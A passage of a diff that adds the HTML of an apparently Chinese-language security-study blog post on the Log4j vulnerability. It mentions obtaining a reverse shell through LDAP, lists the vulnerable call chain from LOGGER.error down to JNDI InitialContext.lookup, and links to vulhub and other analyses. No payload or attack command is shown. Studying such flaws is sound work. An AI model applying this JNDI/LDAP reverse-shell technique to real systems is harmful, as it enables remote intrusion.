+        data-srcset="java%E5%AE%89%E5%85%A8%20Log4j.assets/image-20230927201745462.png, java%E5%AE%89%E5%85%A8%20Log4j.assets/image-20230927201745462.png 1.5x, java%E5%AE%89%E5%85%A8%20Log4j.assets/image-20230927201745462.png 2x"
+        data-sizes="auto"
+        alt="java%E5%AE%89%E5%85%A8%20Log4j.assets/image-20230927201745462.png"
+        title="image-20230927201745462" /></p>
+<p>有了之前<code>fastjson</code>的复现经验，发现用ldap反弹shell还算顺利</p>
+<h3 id="漏洞分析-1">漏洞分析</h3>
+<pre tabindex="0"><code>LOGGER.error
+  ......
+    MessagePatternConverter.format
+      ....
+        StrSubstitutor.resolveVariable
+          Interpolator.lookup
+            JndiLookup.lookup
+              JndiManager.lookup
+                InitialContext.lookup
+</code></pre><p>发现网上分析文章不多，略麻烦</p>
+<p>参考：</p>
+<p><a href="http://leekos.fun/index.php/archives/246/" target="_blank" rel="noopener noreffer">http://leekos.fun/index.php/archives/246/</a>
+</p>
+<p><a href="https://github.com/vulhub/vulhub/blob/master/log4j/" target="_blank" rel="noopener noreffer">https://github.com/vulhub/vulhub/blob/master/log4j/</a>
+</p>
+<p><a href="https://github.com/Maskhe/javasec/blob/master/4.log4j%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.md" target="_blank" rel="noopener noreffer">https://github.com/Maskhe/javasec/blob/master/4.log4j%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.md</a>
+</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-log4j/" data-title="java安全 Log4j" data-hashtags="java"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-log4j/" data-hashtag="java"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-log4j/" data-title="java安全 Log4j"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-log4j/" data-title="java安全 Log4j"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-log4j/" data-title="java安全 Log4j"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/java/">Java</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-fastjson/" class="prev" rel="prev" title="java安全 Fastjson"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>java安全 Fastjson</a>
+            <a href="/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E4%B8%8E%E5%AD%97%E8%8A%82%E7%A0%81/" class="next" rel="next" title="java安全 类加载器与字节码">java安全 类加载器与字节码<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
